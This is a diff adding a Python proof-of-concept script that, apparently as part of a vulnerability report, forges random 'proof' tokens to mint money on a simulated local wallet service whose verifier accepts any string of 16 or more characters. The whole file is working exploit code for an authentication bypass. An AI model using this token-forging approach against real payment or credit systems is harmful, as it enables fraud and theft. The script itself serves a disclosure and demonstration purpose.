@@ -1,0 +1,90 @@
+#!/usr/bin/env python3
+"""
+ATTACKER SIDE — mint yourself money on the simulated wallet/credit service
+by exploiting the BoundaryVerifier bypass (see REPORT_RO.md / REPORT.md).
+
+The attacker has:
+  - no signing key
+  - no grant / approval
+  - no prior relationship with the "issuer"
+
+...and still walks away with a wallet full of money, because
+BoundaryVerifier.verify_boundary() accepts any string >= 16 chars as a
+"valid proof" (see actenon/boundary/__init__.py).
+
+Run the defender first:
+    python3 credit_service.py --port 8900
+
+Then run this:
+    python3 attacker_drain_credit.py --url http://127.0.0.1:8900 --account attacker-wallet --rounds 5 --amount 500000
+"""
+
+from __future__ import annotations
+
+import argparse
+import json
+import secrets
+import urllib.request
+
+
+def forge_proof_token() -> str:
+    """A 'proof' that is nothing but random bytes. No key, no signature,
+    not even shaped like a PCCB. Only requirement: >= 16 characters,
+    because that's literally the entire check BoundaryVerifier performs.
+    """
+    return "forged-" + secrets.token_hex(16)
+
+
+def post_json(url: str, payload: dict) -> tuple[int, dict]:
+    data = json.dumps(payload).encode("utf-8")
+    req = urllib.request.Request(url, data=data, headers={"Content-Type": "application/json"}, method="POST")
+    try:
+        with urllib.request.urlopen(req) as resp:
+            return resp.status, json.loads(resp.read())
+    except urllib.error.HTTPError as exc:
+        return exc.code, json.loads(exc.read())
+
+
+def get_json(url: str) -> dict:
+    with urllib.request.urlopen(url) as resp:
+        return json.loads(resp.read())
+
+
+def main() -> int:
+    parser = argparse.ArgumentParser(description="Attacker: mint free credit via the BoundaryVerifier bypass.")
+    parser.add_argument("--url", default="http://127.0.0.1:8900")
+    parser.add_argument("--account", default="attacker-wallet")
+    parser.add_argument("--rounds", type=int, default=5)
+    parser.add_argument("--amount", type=int, default=500_000, help="amount per round, in minor units (bani/cents)")
+    args = parser.parse_args()
+
+    print(f"[attacker] Target: {args.url}")
+    print(f"[attacker] No signing key. No grant. No relationship with the issuer. Let's go.\n")
+
+    for round_number in range(1, args.rounds + 1):
+        forged_token = forge_proof_token()
+        payload = {
+            "account_id": args.account,
+            "amount_minor": args.amount,
+            "proof_token": forged_token,   # <-- completely unsigned garbage
+            "action_hash": secrets.token_hex(32),  # <-- arbitrary, never checked
+            "audience": "service:wallet",
+            "boundary_id": "wallet-credit-api",
+        }
+        status, response = post_json(f"{args.url}/wallet/credit", payload)
+        ok = response.get("ok")
+        balance = response.get("balance_minor")
+        print(f"[round {round_number}] forged_token={forged_token[:24]}... "
+              f"-> HTTP {status}, ok={ok}, balance_minor={balance}")
+
+    final = get_json(f"{args.url}/wallet/balance?account_id={args.account}")
+    total = final["balance_minor"]
+    print(f"\n[attacker] Final balance for '{args.account}': {total} minor units "
+          f"({total / 100:.2f} in major currency units)")
+    print("[attacker] None of this was ever signed by a real key. "
+          "The 'proof' was random bytes accepted as valid at the resource boundary.")
+    return 0
+
+
+if __name__ == "__main__":
+    raise SystemExit(main())
